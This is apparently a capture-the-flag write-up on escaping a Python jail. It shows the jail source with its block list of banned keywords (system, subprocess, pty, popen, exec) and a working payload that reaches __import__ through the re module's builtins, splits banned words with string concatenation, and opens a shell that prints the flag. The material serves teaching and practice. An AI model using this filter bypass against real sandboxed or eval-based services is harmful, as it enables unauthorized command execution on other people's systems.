### pyjail

Escape me plz

EU instance: 207.180.200.166 1024

US instance: 45.134.3.200 1024

jail.py

```py
#!/usr/bin/env python3

import re
from sys import modules, version

banned = "import|chr|os|sys|system|builtin|exec|eval|subprocess|pty|popen|read|get_data"
search_func = lambda word: re.compile(r"\b({0})\b".format(word), flags=re.IGNORECASE).search

modules.clear()
del modules

def main():
    print(f"{version}\n")
    print("What would you like to say?")
    for _ in range(2):
        text = input('>>> ').lower()
        check = search_func(banned)(''.join(text.split("__")))
        if check:
            print(f"Nope, we ain't letting you use {check.group(0)}!")
            break
        if re.match("^(_?[A-Za-z0-9])*[A-Za-z](_?[A-Za-z0-9])*$", text):
            print("You aren't getting through that easily, come on.")
            break
        else:
            exec(text, {'globals': globals(), '__builtins__': {}}, {'print':print})

if __name__ == "__main__":
    main()

```

since `__builtins__` has been overwritten, so I used `globals` to get at the builtins of `re`
```py
print(globals['re'].__builtins__)
```

from here we can access `__import__` and import os to get a shell

```py
print(globals['re'].__builtins__['__import__']('os').__dict__['system']('sh'))
```

```sh
Nope, we ain't letting you use import!
```

ahh, need to get around the filter, using some string concatenation this isn't a problem

```py
print(globals['re'].__builtins__['__impo'+'rt__']('o'+'s').__dict__['sy'+'stem']('sh'))
```

```sh
What would you like to say?
>>> print(globals['re'].__builtins__['__impo'+'rt__']('o'+'s').__dict__['sy'+'stem']('sh'))
ls
flag.txt
jailbreak.py
run.sh
ynetd
cat flag.txt
flag{l3t's_try_sc0p1ng_th1s_0ne_2390098}
exit
0
>>> 

```






